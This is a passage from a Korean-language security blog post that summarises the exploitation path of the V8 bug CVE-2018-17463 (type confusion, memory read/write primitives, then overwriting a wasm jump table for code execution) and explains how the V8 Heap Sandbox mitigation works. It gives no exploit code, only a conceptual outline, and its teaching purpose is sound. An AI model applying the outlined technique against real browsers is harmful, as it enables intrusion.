1. 취약점 → 프리미티브 구축 단계: Type Confusion을 분석하고, 이를 통해 안정적인 읽기/쓰기(메모리) 프리미티브를 만들어 내는 과정입니다. 이 부분은 취약점의 원리와 엔진 내부 동작 이해가 핵심입니다.
2. 프리미티브 → 코드 실행(weaponizing·pwn) 단계: 확보한 프리미티브를 이용해 실행 가능한 메모리(RWX)를 표적으로 삼아 실제 코드를 실행하는 과정입니다. 이 단계는 전통적인 pwnable/exploit 엔지니어링의 영역으로 볼 수 있습니다.

즉, **CVE-2018-17463** 사례를 기준으로 보면, Type Confusion을 통해 Memory Read/Write primitive를 만드는 일까지가 ‘취약점·엔진 레벨의 연구’에 해당하고, 그 이후 wasm 인스턴스·점프테이블을 덮어써 실제 RCE로 이어지는 부분은 보다 pwnable한 작업으로 분류할 수 있습니다. 

자 pwnable을 공부하셨던 분들이라면 이제 감이 슬슬 오실 수도 있는데, 이런 exploit이 나오면 역사적으로 무엇이 나왔죠?! 바로 mitigation 입니다 :( 

~~(취약점을 공부하는 입장에서 웃어야 할 지 울어야 할 지 모르겠네요 😂)~~

V8은 개발자의 의도와 상관없이 최적화하는 과정에서 Type Confusion과 같은 취약점이 발생할 수 있습니다. 이런 경우가 너무 많아서 2020년 초에 V8에 Heap Sandbox라는 mitigation을 도입했습니다. Heap Sandbox가 무엇이고 어떻게 완화된건지 계속 살펴보러가시죠! ㅎ.ㅎ

# 2. V8 Heap Sandbox

2장에서 말하는 샌드박스는 크롬 전체 프로그램의 샌드박스가 아닌 렌더링 프로세스에서의 샌드박스, 즉 V8 에서의 힙 샌드박스를 의미합니다.

## 2.1 Motivation

![image.png](image%205.png)

샌드박스가 나오기 몇 년 간 Chrome 익스플로잇의 60% 이상이 V8에서 시작되었지만, 대부분은 고전적인 메모리 버그(UAF, OOB)가 아니었습니다. JIT 컴파일러나 런타임 코드 내의 미묘한 논리적 버그나, 이 논리적 버그를 이용한 memory corruption이었습니다. 이러한 버그는 개발(코딩)을 잘한다고 해서 막을 수 있는게 아니었습니다. 컴파일러 자체가 공격 표면이기 때문입니다. 따라서 V8은 힙 내부의 메모리 손상이 프로세스 전체로 퍼지는 것을 막는 맞춤형 방어선이 필요했고 이것이 **V8 힙 샌드박스**의 핵심 목표입니다.

즉, **취약점으로 인해 임의값(특히 포인터)이 쓰이더라도 그 값이 곧바로 엔진의 실행 흐름을 장악하지 못하게 만드는 것**입니다. 그러나 여느 프로그램과 동일하게 이러한 보안이 오버헤드가 크면 안됩니다. 이를 위해 Heap Sandbox는 일반적으로 다음과 같은 개념적 방식을 취합니다.

- **메모리 분리·격리**: 엔진의 힙 메모리를 런타임의 다른 메모리(호스트 주소 공간, JIT 코드 페이지 등)와 논리적·물리적으로 분리하여, 힙 상의 값이 곧바로 외부 실행영역으로 이어지지 않도록 합니다.
- **포인터 캡슐화 및 검증**: 힙에 저장된 포인터 표현을 인코딩(태깅)하거나, 포인터를 실제로 사용하기 전에 유효성 검사 절차를 거쳐 호스트 주소와 섞이지 않게 합니다.
- **제한적 디퍼런싱·경계 검사**: 힙에서 읽은 값이 실행 가능한 코드 주소인지 아닌지 엄격히 구분하고, 임의값을 함수 포인터로 곧바로 해석·실행하지 않도록 접근을 제한합니다.

이처럼 V8 샌드박스 디자인은 공격자가 V8 힙 내의 메모리를 임의로 변조할 수 있다는 전제 하에 다른 프로세스 메모리를 보호하는 데 중점을 둡니다.

## 2.2 Implementation

샌드박스 설계의 핵심 아이디어는 **V8 엔진 내부에서의 주소 디레퍼런싱을 직접적인 포인터 연산이 아니라 오프셋·인덱스 기반으로 처리**하도록 바꾸는 데 있습니다. 이렇게 하면 힙 상의 임의값이 곧바로 호스트 주소 공간이나 실행 코드로 이어지는 것을 방지할 수 있으며, 런타임에서의 포인터 취급을 엄격하게 제어할 수 있습니다. 아래는 이 설계에 대해 high-level 단에서 표현한 그림입니다.

![image.png](image%206.png)

이 컨셉은 “샌드백스 영역 지정 / 내·외부의 포인터 처리 / 신뢰할 수 있는 공간”으로 나눌 수 있는데 이에 대해 구체적으로 더 알아보겠습니다. 

### 1. 샌드박스 영역 지정 (Sandbox Address Space)

샌드박스는 V8이 직접 접근하는 주요 메모리(엔진 힙, ArrayBuffer의 backing stores, Wasm 메모리 등)를 포함하는 **대형 가상 주소 공간**입니다. 실제 메모리가 아닌 가상 공간에 수 TB 단위로 예약해 두고 그 공간을 ‘샌드박스’로 정의합니다. 또한 샌드박스 주변에는 넉넉한 가드 영역을 두어 샌드박스 내부 배열 인덱스가 경계를 넘어 외부로 탈출하는 것을 물리적으로나 논리적으로 방지합니다.

![image.png](image%207.png)

### 2. 샌드박스 내 포인터 처리 (Sandboxed Pointers)

샌드박스 내부의 객체 참조는 메모리상의 실제 물리 주소가 아니라 **샌드박스 시작점으로부터의 오프셋**으로 표현됩니다. 이른바 SandboxedPointer는 샌드박스 베이스를 기준으로 고정 크기(e.g., 40bit) 오프셋을 사용하므로, 오프셋 값 자체가 변경되더라도 그 값이 가리키는 주소는 항상 샌드박스 내부로 한정됩니다. 보안적으로는 샌드박스 외부로의 임의 접근을 원천 봉쇄하는 장점이 있고, 성능적으로도 샌드박스 베이스를 CPU 레지스터에 올려두면 오프셋→주소 변환을 x64에서 추가 명령 2개, arm64에서는 1개로 매우 효율적으로 수행할 수 있습니다.

### 3. 샌드박스 외부 포인터 처리 (Pointer Tables)

샌드박스 외부의 객체(e.g., DOM 노드, 외부 확장 객체 등)는 샌드박스 내부에서 직접 포인터를 갖지 않고 **포인터 테이블(pointer table)**을 통해 간접 참조합니다. 샌드박스 내부의 오브젝트는 이 테이블의 실제 포인터 대신 **테이블 인덱스**를 저장하고, 런타임에서 인덱스를 통해 외부 포인터를 조회합니다. 이 접근 방식은 여러 측면에서 안전성을 향상시킵니다. 우선 공간적 안전성(Spatial safety)을 위해 테이블 범위를 넘는 인덱스 접근을 차단하고, 시간적 안전성(Temporal safety)은 GC가 테이블 엔트리를 관리·회수함으로써 확보합니다. 또한 각 테이블 엔트리는 포인터와 함께 **타입 태그(type tag)** 를 포함하도록 설계되어, 포인터를 로드할 때 기대되는 타입과 일치하는지 검증함으로써 Type Confusion 공격을 방지합니다. 

![image.png](image%208.png)

### 4. 신뢰된 공간 (Trusted Space)

일부 V8 내부 객체(e.g., 바이트코드 배열, Deoptimization 데이터)는 샌드박스 메커니즘만으로는 충분히 보호하기 어렵거나, 잘못 취급될 경우 샌드박스 우회로 이어질 가능성이 있습니다. 이를 위해 샌드박스 외부에 별도의 **신뢰된(Trusted) 힙 영역**을 할당하고, 이 영역에 민감한 객체를 모아놓습니다. 이 공간은 자체적인 포인터 압축 케이지를 갖고 있으며, 샌드박스 내부에서는 이들을 직접 참조하지 않고 TPT(Trusted Pointer Table) 같은 간접 참조 메커니즘을 통해 접근합니다. 결과적으로 공격자가 샌드박스 내부에서 임의 값을 조작하더라도, 신뢰된 객체에 대한 직접적인 무단 접근·조작 가능성은 대폭 줄어듭니다.

![image.png](image%209.png)

### 요약

요약하면, 샌드박스 설계는 (1) 큰 가상 주소 공간으로 힙을 격리하고, (2) 샌드박스 내부에서는 오프셋 기반의 안전한 포인터 표현을 사용하며, (3) 샌드박스 외부 대상은 인덱스 기반 테이블을 통해 간접 참조하고, (4) 특히 민감한 객체는 별도의 신뢰된 공간으로 격리하는 방식으로 구성됩니다. 이러한 다층적 접근은 힙 기반 취약점이 곧바로 실행 권한 탈취로 이어지는 경로를 차단하는 데 효과적입니다.

![image.png](image%2010.png)

# Outro

샌드박스 이전에는 힙 상의 포인터를 단순히 덮어써서 `TypedArray`의 `backing_store` 같은 내부 필드를 가리키게 하는 것만으로도 프로세스 메모리 전반에 걸친 임의 주소 읽기/쓰기(AAR/W) 능력을 즉시 획득할 수 있었습니다.

그러나 샌드박스의 도입으로 크롬에서의 익스플로잇 난이도는 극적으로 올랐습니다. 가장 직접적인 효과는 포인터 오버라이트 난이도의 증가입니다. 샌드박스는 이러한 간단한 전환 자체를 차단하거나, 덮어쓴 값이 유효한 실행 포인터로 사용되지 않도록 만듭니다. 그 결과, 단일 취약점으로 얻을 수 있었던 Renderer Process RCE 는 Sandbox Escape 라는 과정을 필요로 하게 되었습니다.

하지만 난이도가 올라갔을 뿐 Sandbox만 탈출하면…?

![image (2).jpg](image_(2).jpg)

다음 시간에는 샌드박스가 생긴 후의 렌더러 RCE가 어떻게 이루어지는지 다뤄보겠습니다!

그럼 또 봐요 🙌

# Reference

[https://jhalon.github.io/chrome-browser-exploitation-3/](https://jhalon.github.io/chrome-browser-exploitation-3/)

[https://v8.dev/blog/sandbox](https://v8.dev/blog/sandbox)

[https://docs.google.com/document/d/1FM4fQmIhEqPG8uGp5o9A-mnPB5BOeScZYpkHjo0KKA8/](https://docs.google.com/document/d/1FM4fQmIhEqPG8uGp5o9A-mnPB5BOeScZYpkHjo0KKA8/)

[https://saelo.github.io/presentations/offensivecon_24_the_v8_heap_sandbox.pdf](https://saelo.github.io/presentations/offensivecon_24_the_v8_heap_sandbox.pdf)

[https://m.blog.naver.com/funraon/223669595583](https://m.blog.naver.com/funraon/223669595583)
